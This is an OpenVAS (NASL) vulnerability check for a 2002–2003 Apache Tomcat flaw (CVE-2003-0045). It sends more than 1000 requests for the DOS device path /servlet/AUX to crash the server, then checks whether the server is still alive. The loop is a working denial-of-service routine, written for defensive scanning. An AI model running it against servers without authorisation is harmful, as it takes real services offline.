# OpenVAS Vulnerability Test
# $Id: tomcat_devname_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Tomcat servlet engine MS/DOS device names denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to freeze or crash Windows or the web server
by reading a thousand of times a MS/DOS device through Tomcat 
servlet engine, using a file name like /examples/servlet/AUX

A cracker may use this flaw to make your system crash 
continuously, preventing you from working properly.";

tag_solution = "Upgrade your Apache Tomcat web server to version 4.1.10.";

# See also script 10930 http_w98_devname_dos.nasl
#
# Vulnerable servers:
# Apache Tomcat 3.3
# Apache Tomcat 4.0.4
# All versions prior to 4.1.x may be affected as well.
# Apache Tomcat 4.1.10 (and probably higher) is not affected.
# 
# Microsoft Windows 2000
# Microsoft Windows NT may be affected as well.
#
# References:
# Date: Fri, 11 Oct 2002 13:36:55 +0200
# From:"Olaf Schulz" <olaf.schulz@t-systems.com>
# To:cert@cert.org, bugtraq@securityfocus.com, vulnwatch@vulnwatch.org
# Subject: Apache Tomcat 3.x and 4.0.x: Remote denial-of-service vulnerability

if(description)
{
 script_id(11150);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2003-0045");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_name("Tomcat servlet engine MS/DOS device names denial of service");
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_description(desc);
 
 summary = "Kills Apache Tomcat by reading 1000+ times a MS/DOS device through the servlet engine";
 script_summary(summary);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

# The script code starts here

include("http_func.inc");

start_denial();

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

banner = get_http_banner(port);
if ("Tomcat" >!< banner)
  exit (0);

if (http_is_dead(port: port)) exit(0);
soc = http_open_socket(port);
if (! soc) exit(0);

# We should know where the servlets are
url = "/servlet/AUX";
req = http_get(item: url, port: port);

for (i = 0; i <= 1000; i = i + 1)
{
  send(socket: soc, data: req);
  http_close_socket(soc);
  soc = http_open_socket(port);
  if (! soc)
  {
    sleep(1);
    soc = http_open_socket(port);
    if (! soc)
      break;
  }
}

if (soc) http_close_socket(soc);
# sleep(1);
alive = end_denial();
if (! alive || http_is_dead(port: port)) security_warning(port);
